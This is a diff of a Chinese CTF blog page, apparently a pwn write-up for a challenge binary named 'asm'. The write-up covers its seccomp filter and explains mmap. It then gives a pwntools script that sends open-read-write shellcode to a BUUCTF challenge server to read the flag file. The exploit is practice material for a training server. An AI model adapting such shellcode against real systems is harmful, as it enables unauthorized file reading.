+&#125;
+</code></pre>
+<p>分析题目，有sandbox，所以开启了沙盒保护，所以先用seccomp-tools检查哪些系统调用被允许。</p>
+<pre class="highlight"><code class="shell"> seccomp-tools dump ./asm
+  line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
+ 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre>
+<p>发现系统允许调用<code>read write open</code>，所以就用<code>orw</code>，然后考虑我们应该把<code>open</code>出的<code>flag</code>读到哪里。注意到</p>
+<p><code>s = (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL)</code>，表明在<code>0x41414000</code>这里开辟了<code>0x1000</code>的内存大小。所以考虑读入到<code>0x41414000</code>。然后payload中使用了<code>shellcraft</code>模块来生成<code>shellcode</code>。具体怎么使用，以后在具体总结总结</p>
+<p>再说一下<code>mmap</code>函数的作用(<code>mmap</code>, 从函数名就可以看出来这是memory map, 即地址的映射, 是一种内存映射文件的方法)</p>
+<pre class="highlight"><code class="cpp"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* start,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offset)</span></span>; 
+<span class="hljs-comment">//start:映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。</span>
+<span class="hljs-comment">//映射区的长度。//长度单位是 以字节为单位，不足一内存页按一内存页处理 </span>
+<span class="hljs-comment">//成功执行时，mmap()返回被映射区的 指针，失败时，mmap()返回MAP_FAILED[其值为(void *)-1]</span>
+</code></pre>
+</li>
 <li>
 <p>payload</p>
-<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'Linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token string">'27383'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./asm'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>offset<span class="token operator">=</span><span class="token number">0x41414000</span></pre></td></tr><tr><td data-num="6"></td><td><pre>payload<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="7"></td><td><pre>payload<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>offset<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>offset<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>payload<span class="token operator">=</span>asm<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure></li>
+<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;Linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
+p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;27383&#x27;</span>)
+elf=ELF(<span class="hljs-string">&#x27;./asm&#x27;</span>)
+offset=<span class="hljs-number">0x41414000</span>
+payload=<span class="hljs-string">&#x27;&#x27;</span>
+payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,offset,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,offset,<span class="hljs-number">0x100</span>)
+payload=asm(payload)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+</li>
 </ul>
 
   </div>
@@ -302,7 +395,7 @@ Arashimuのblog = CTFer</title>
     <div class="item left">
       
 
-  <a href="/2022/05/08/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicis3attqj20zk0m8k7l.jpg" title="Hello World">
+  <a href="/2022/05/08/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="Hello World">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Hello World</h3>
@@ -312,7 +405,7 @@ Arashimuのblog = CTFer</title>
     <div class="item right">
       
 
-  <a href="/2022/05/17/Misc1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclize41wj20zk0m87gk.jpg" title="Misc1">
+  <a href="/2022/05/17/Misc1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicli9lfebj20zk0m84qp.jpg" title="Misc1">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>Misc1</h3>
@@ -349,7 +442,7 @@ Arashimuのblog = CTFer</title>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">26</span>
+        <span class="count">27</span>
         <span class="name">posts</span>
       </a>
     </div>
@@ -419,7 +512,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/07/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="sql注入学习">sql注入学习</a></span>
+    <span><a href="/2023/04/16/largebin-attach/" title="largebin_attach">largebin_attach</a></span>
   </li>
 
       
@@ -428,7 +521,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+    <span><a href="/2023/04/16/tcache-stashing-unlink-attack/" title="tcache_stashing_unlink_attack">tcache_stashing_unlink_attack</a></span>
   </li>
 
       
@@ -437,7 +530,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
+    <span><a href="/2023/04/16/house-of-pig/" title="house_of_pig">house_of_pig</a></span>
   </li>
 
       
@@ -446,16 +539,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/25/ciscn-pwn%E6%B3%9B%E5%81%9A/" title="ciscn_pwn泛做">ciscn_pwn泛做</a></span>
+    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
   </li>
 
       
@@ -473,7 +557,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+    <span><a href="/2022/09/29/Paillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/" title="Paillier同态加密">Paillier同态加密</a></span>
   </li>
 
       
@@ -482,7 +566,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
   </li>
 
       
@@ -491,7 +575,7 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+    <span><a href="/2023/03/26/2023-3-PWHHUB/" title="2023_3_PWHHUB">2023_3_PWHHUB</a></span>
   </li>
 
       
@@ -500,7 +584,16 @@ Arashimuのblog = CTFer</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+    <span><a href="/2023/02/21/house-of-botcake/" title="house_of_botcake">house_of_botcake</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
   </li>
 
   </ul>
